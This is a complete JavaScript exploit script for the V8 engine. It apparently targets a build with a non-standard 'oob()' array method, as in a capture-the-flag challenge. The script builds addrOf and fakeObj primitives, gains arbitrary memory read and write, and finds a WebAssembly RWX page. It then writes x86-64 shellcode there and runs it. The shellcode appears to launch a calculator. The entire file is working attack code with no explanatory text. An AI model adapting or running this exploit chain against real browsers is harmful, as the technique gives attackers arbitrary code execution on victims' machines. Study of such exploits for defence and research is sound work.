/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var obj = {"3vil": "c0de"};
var objArr = [obj];
var fltArr = [1.1];
var objMap = ftoi(objArr.oob());
var fltMap = ftoi(fltArr.oob());

//var elementsOffset = 0x88n;
var elementsOffset = -0x20n;
var fakeObject = [
    itof(fltMap),       // map
    1.1,                // properties
    1.2,                // elements
    1.4                 // length
]

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + Number(val).toString(16);
}

function addrOf(o) {
    // put desired object as first element
    objArr[0] = o;
    // replace PACKED_ELEMENTS map with PACKED_DOUBLE_ELEMENTS map
    objArr.oob(itof(fltMap));
    // access the first element as Double
    result = objArr[0];
    // put PACKED_ELEMENTS map back
    objArr.oob(itof(objMap));
    return ftoi(result);
}

function fakeObj(addr) {
    // put address to fake object
    fltArr[0] = itof(addr);
    // replace PACKED_DOUBLE_ELEMENTS map with PACKED_ELEMENTS map
    fltArr.oob(itof(objMap));
    // get element as object
    let result = fltArr[0];
    // put PACKED_DOUBLE_ELEMENTS map back
    fltArr.oob(itof(fltMap));
    return result;
}

function writeData(addr, val) {
    // replace evil elements pointer with specified address
    fakeObject[2] = itof(BigInt(addr) - 0x10n);
    // get address of the fake object
    let fakeObjAddr = addrOf(fakeObject);
    // inject fake object with elements pointing to specified address
    let resultObj = fakeObj(fakeObjAddr + elementsOffset);
    // write to the addr
    resultObj[0] = itof(BigInt(val));
}

function readData(addr) {
    if (addr % 2n == 0)
        addr += 1n;
    // replace evil elements pointer with specified address
    fakeObject[2] = itof(BigInt(addr) - 0x10n);
    // get address of the fake object
    let fakeObjAddr = addrOf(fakeObject);
    // inject fake object with elements pointing to specified address
    let resultObj = fakeObj(fakeObjAddr + elementsOffset);
    // return value under address
    return resultObj[0];
}

console.log("[*] Preparing wasm code");
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

wasmAddr = addrOf(wasm_instance);
console.log("[+] wasm instance @", hex(wasmAddr));

buf = new ArrayBuffer(0x100);
dataview = new DataView(buf);

console.log("[+] evil buf @", hex(addrOf(buf)));

rwx_page = ftoi(readData(wasmAddr + 0x88n));

console.log("[+] rwx @", hex(rwx_page));

var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

writeData(addrOf(buf) + 0x20n, rwx_page);
console.log("[+] Successfully overwritten backed store with RWX page address");

console.log("[*] Writing shellcode to RWX page");
for (i = 0; i < shellcode.length; ++i) {
    dataview.setUint32(i*4, shellcode[i], true);
}

console.log("[*] Running shellcode");
f()
